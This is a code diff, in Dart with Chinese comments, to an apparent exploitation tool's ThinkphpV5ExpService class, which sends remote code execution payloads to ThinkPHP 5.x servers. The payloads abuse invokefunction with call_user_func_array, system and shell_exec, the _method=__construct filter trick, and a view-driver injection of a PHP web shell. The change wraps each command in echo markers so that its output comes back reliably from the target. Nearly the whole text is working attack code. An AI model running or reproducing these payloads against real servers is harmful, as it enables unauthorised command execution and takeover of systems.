@@ -213,24 +213,44 @@ class ThinkphpV5ExpService {
     return ThinkphpResult(false, 'ThinkPHP 5.x _method=filter RCE', '');
   }
 
+  /// 从响应中提取 `begin...end` 之间的命令输出（页面夹 HTML 时仍可靠）。
+  String? _extractMarked(String body, String begin, String end) {
+    final i = body.indexOf(begin);
+    if (i < 0) return null;
+    final j = body.indexOf(end, i + begin.length);
+    if (j < 0) return null;
+    final out = body.substring(i + begin.length, j).trim();
+    return out.isEmpty ? null : out;
+  }
+
   Future<String?> exeRce(ThinkphpVulnType type, String cmd) async {
     final mod = await getModule();
-    final encodedCmd = Uri.encodeComponent(cmd);
+    // 用唯一标记包住命令：ThinkPHP 的页面会在输出前后夹 HTML，
+    // 仅"截取 < 之前"的旧逻辑对纯文本输出（如 echo）会截错。
+    const begin = 'MXEXEC_S';
+    const end = 'MXEXEC_E';
+    final wrapped = 'echo $begin; $cmd; echo $end';
+    final encodedCmd = Uri.encodeComponent(wrapped);
 
     switch (type) {
       case ThinkphpVulnType.tp50:
         final u = '${baseUri}?s=/$mod/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=$encodedCmd';
         final res = await http.get(Uri.parse(u)).timeout(timeout);
-        return extractBeforeHtml(res.body);
+        return _extractMarked(res.body, begin, end) ?? extractBeforeHtml(res.body);
       case ThinkphpVulnType.tp5010:
         final base = '${baseUri}?s=$mod';
         final payload = 's=$encodedCmd&_method=__construct&method&filter[]=system';
-        final res = await http.post(Uri.parse(base), body: formMap(payload)).timeout(timeout);
-        return extractBeforeHtml(res.body);
+        // payload 里的命令已 Uri.encodeComponent，不能再经 formMap 解析重编码
+        final res = await http.post(
+          Uri.parse(base),
+          headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+          body: payload,
+        ).timeout(timeout);
+        return _extractMarked(res.body, begin, end) ?? extractBeforeHtml(res.body);
       case ThinkphpVulnType.tp5022_5129:
         final u = '${baseUri}?s=/$mod/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=$encodedCmd';
         final res = await http.get(Uri.parse(u)).timeout(timeout);
-        return res.body;
+        return _extractMarked(res.body, begin, end) ?? res.body;
       case ThinkphpVulnType.tp5023:
         final payloadUrl = '${baseUri}?s=captcha&test=-1';
         final payloads = [
@@ -239,20 +259,24 @@ class ThinkphpV5ExpService {
           's=$encodedCmd&_method=__construct&method&filter[]=system',
         ];
         for (final p in payloads) {
-          final res = await http.post(Uri.parse(payloadUrl), body: formMap(p)).timeout(timeout);
-          final out = extractBeforeHtml(res.body);
+          final res = await http.post(
+            Uri.parse(payloadUrl),
+            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+            body: p,
+          ).timeout(timeout);
+          final out = _extractMarked(res.body, begin, end) ?? extractBeforeHtml(res.body);
           if (out.isNotEmpty) return out;
         }
         return null;
       case ThinkphpVulnType.tp5023Debug:
         final body = {'_method': '__construct', 'filter[]': 'system', 'server[REQUEST_METHOD]': cmd};
         final res = await http.post(baseUri, body: body).timeout(timeout);
-        return extractBeforeHtml(res.body);
+        return _extractMarked(res.body, begin, end) ?? extractBeforeHtml(res.body);
       case ThinkphpVulnType.tp5ViewDisplay:
         final content = Uri.encodeComponent('<?php system(\$_GET["c"]);?>');
         final u = '${baseUri}?s=/$mod/\\think\\view\\driver\\Php/display&content=$content&c=$encodedCmd';
         final res = await http.get(Uri.parse(u)).timeout(timeout);
-        return extractBeforeHtml(res.body);
+        return _extractMarked(res.body, begin, end) ?? extractBeforeHtml(res.body);
       case ThinkphpVulnType.tp5MethodFilter:
         final body = {'c': 'system', 'f': cmd, '_method': 'filter'};
         final res = await http.post(baseUri, body: body).timeout(timeout);
